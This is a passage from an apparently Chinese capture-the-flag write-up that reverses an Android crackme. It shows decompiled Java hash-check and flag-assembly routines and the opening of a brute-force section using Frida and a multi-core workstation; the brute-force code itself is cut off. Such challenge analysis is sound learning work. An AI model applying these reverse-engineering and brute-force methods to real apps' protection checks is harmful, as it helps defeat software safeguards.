class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] clips_i_bytes = a.hex2Bytes(clips[ind]);  <span class="comment">// format check 8位16进制字符串</span></span><br><span class="line">    <span class="keyword">if</span>(clips_i_bytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;clips format error, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            clipsi[ind].setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            ++ind;  <span class="comment">// clean clips</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ind3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rndKey = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ind3 &lt; clips_i_bytes.length) &#123;</span><br><span class="line">        rndKey = rndKey &lt;&lt; <span class="number">1</span> | (clips_i_bytes[ind3] &amp; <span class="number">0x80</span>) &gt;&gt;&gt; <span class="number">7</span>;  <span class="comment">// rndKey 是8个byte的最高位组合</span></span><br><span class="line">        clips_i_bytes[ind3] = (<span class="keyword">byte</span>)(clips_i_bytes[ind3] &amp; <span class="number">0x7F</span>);  <span class="comment">// clips_i_bytes 只保留7位,刚好保证在ASCII范围内</span></span><br><span class="line">        ++ind3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String clips_i_hash = a.hash_int_string_add0_0_16(rndKey, clips_i_bytes);  <span class="comment">// rndKeys[ind] == rndKey</span></span><br><span class="line">    <span class="keyword">if</span>(clips_i_hash != <span class="keyword">null</span> </span><br><span class="line">       &amp;&amp; (clips_i_hash.equals(a.hash_int_string_add0_0_16(a.rndKeys[ind], clips_i_bytes))) </span><br><span class="line">       &amp;&amp; (clips_i_hash.equals(a.clips_i_hash_mat[ind]))) </span><br><span class="line">    &#123;</span><br><span class="line">        ++ind;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;your clip is not suitable, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    <span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        clipsi[ind].setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        ++ind;  <span class="comment">// clean clips</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hash_int_string_add0_0_16</span><span class="params">(<span class="keyword">int</span> argRndKey, <span class="keyword">byte</span>[] argBytes)</span> </span>&#123;</span><br><span class="line">    String v0_1;</span><br><span class="line">    <span class="keyword">byte</span>[] argBytes1 = argBytes;</span><br><span class="line">    <span class="keyword">if</span>((argRndKey &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(argRndKey &amp; <span class="number">7</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">4</span>]);</span><br><span class="line">        <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">5</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">6</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">7</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v1 = argRndKey &amp; <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span>(v1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_11 = MessageDigest.getInstance(<span class="string">&quot;MD2&quot;</span>);</span><br><span class="line">                v1_11.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_13 = v1_11.digest();</span><br><span class="line">                <span class="keyword">char</span>[] v1_12 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                <span class="keyword">char</span>[] v2_1 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_13.length * <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">int</span> v3_5 = v0_13.length;</span><br><span class="line">                <span class="keyword">int</span> v4_5 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> v5_1 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(v4_5 &lt; v3_5) &#123;</span><br><span class="line">                    <span class="keyword">int</span> v6_1 = v0_13[v4_5];</span><br><span class="line">                    <span class="keyword">int</span> v8_1 = v5_1 + <span class="number">1</span>;</span><br><span class="line">                    v2_1[v5_1] = v1_12[v6_1 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                    v5_1 = v8_1 + <span class="number">1</span>;</span><br><span class="line">                    v2_1[v8_1] = v1_12[v6_1 &amp; <span class="number">15</span>];</span><br><span class="line">                    ++v4_5;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = <span class="keyword">new</span> String(v2_1);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_12) &#123;</span><br><span class="line">                v0_12.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_9 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                v1_9.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_11 = v1_9.digest();</span><br><span class="line">                <span class="keyword">char</span>[] v1_10 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                <span class="keyword">char</span>[] v2 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_11.length * <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">int</span> v3_4 = v0_11.length;</span><br><span class="line">                <span class="keyword">int</span> v4_4 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> v5 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(v4_4 &lt; v3_4) &#123;</span><br><span class="line">                    <span class="keyword">int</span> v6 = v0_11[v4_4];</span><br><span class="line">                    <span class="keyword">int</span> v8 = v5 + <span class="number">1</span>;</span><br><span class="line">                    v2[v5] = v1_10[v6 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                    v5 = v8 + <span class="number">1</span>;</span><br><span class="line">                    v2[v8] = v1_10[v6 &amp; <span class="number">15</span>];</span><br><span class="line">                    ++v4_4;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = <span class="keyword">new</span> String(v2);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_10) &#123;</span><br><span class="line">                v0_10.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_7 = MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line">                v1_7.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_9 = v1_7.digest();</span><br><span class="line">                StringBuilder v1_8 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3_3 = v0_9.length;</span><br><span class="line">                <span class="keyword">int</span> v4_3;</span><br><span class="line">                <span class="keyword">for</span>(v4_3 = <span class="number">0</span>; v4_3 &lt; v3_3; ++v4_3) &#123;</span><br><span class="line">                    v1_8.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_9[v4_3])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_8.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_8) &#123;</span><br><span class="line">                v0_8.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_5 = MessageDigest.getInstance(<span class="string">&quot;SHA-224&quot;</span>);</span><br><span class="line">                v1_5.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_7 = v1_5.digest();</span><br><span class="line">                StringBuilder v1_6 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3_2 = v0_7.length;</span><br><span class="line">                <span class="keyword">int</span> v4_2;</span><br><span class="line">                <span class="keyword">for</span>(v4_2 = <span class="number">0</span>; v4_2 &lt; v3_2; ++v4_2) &#123;</span><br><span class="line">                    v1_6.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_7[v4_2])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_6.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_6) &#123;</span><br><span class="line">                v0_6.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_3 = MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">                v1_3.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_5 = v1_3.digest();</span><br><span class="line">                StringBuilder v1_4 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3_1 = v0_5.length;</span><br><span class="line">                <span class="keyword">int</span> v4_1;</span><br><span class="line">                <span class="keyword">for</span>(v4_1 = <span class="number">0</span>; v4_1 &lt; v3_1; ++v4_1) &#123;</span><br><span class="line">                    v1_4.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_5[v4_1])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_4.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_4) &#123;</span><br><span class="line">                v0_4.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">5</span> &amp;&amp; argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest v1_1 = MessageDigest.getInstance(<span class="string">&quot;SHA-384&quot;</span>);</span><br><span class="line">            v1_1.update(argBytes1);</span><br><span class="line">            <span class="keyword">byte</span>[] v0_3 = v1_1.digest();</span><br><span class="line">            StringBuilder v1_2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">int</span> v3 = v0_3.length;</span><br><span class="line">            <span class="keyword">int</span> v4;</span><br><span class="line">            <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3; ++v4) &#123;</span><br><span class="line">                v1_2.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_3[v4])));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v0_1 = v1_2.toString();</span><br><span class="line">            <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException v0_2) &#123;</span><br><span class="line">            v0_2.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flag生成<br>flag的生成如下，不过没怎么关注，因为爆破不需要关注这些。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ind4;</span><br><span class="line"><span class="keyword">for</span>(ind4 = <span class="number">0</span>; ind4 &lt; <span class="number">8</span>; ++ind4) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] clips_i_bytes = a.hex2Bytes(clips[ind4]);</span><br><span class="line">    <span class="keyword">int</span> ind5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rndKey1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ind5 &lt; clips_i_bytes.length) &#123;</span><br><span class="line">        rndKey1 = rndKey1 &lt;&lt; <span class="number">1</span> | (clips_i_bytes[ind5] &amp; <span class="number">0x80</span>) &gt;&gt;&gt; <span class="number">7</span>;</span><br><span class="line">        clips_i_bytes[ind5] = (<span class="keyword">byte</span>)(clips_i_bytes[ind5] &amp; <span class="number">0x7F</span>);</span><br><span class="line">        ++ind5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((rndKey1 &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> ind6;</span><br><span class="line">        <span class="keyword">for</span>(ind6 = <span class="number">0</span>; ind6 &lt; clips_i_bytes.length / <span class="number">2</span>; ++ind6) &#123;</span><br><span class="line">            <span class="keyword">byte</span> v11 = clips_i_bytes[ind6];</span><br><span class="line">            clips_i_bytes[ind6] = clips_i_bytes[clips_i_bytes.length - <span class="number">1</span> - ind6];  <span class="comment">// 把clips_i_bytes倒序一下</span></span><br><span class="line">            clips_i_bytes[clips_i_bytes.length - <span class="number">1</span> - ind6] = v11;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flag_mat[rndKey1 &amp; <span class="number">7</span>] = <span class="keyword">new</span> String(clips_i_bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StringBuilder finalFlag = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">while</span>(v3 &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    finalFlag.append(flag_mat[v3]);</span><br><span class="line">    ++v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v0_1.setText(finalFlag.toString());</span><br></pre></td></tr></table></figure></li><li><p>爆破<br>爆破的形式多种多样，最方便的当然是用Frida直接Hook爆破，无奈手机计算性能不够。<br>在PC上也不行，因为每个clip一共要尝试268435456个可能。<br>于是我找了个12核的工作站来跑，每秒大概可以尝试262144个可能，十多分钟就能跑出来一个clip。<br>开8个同时找，也能很快出结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span 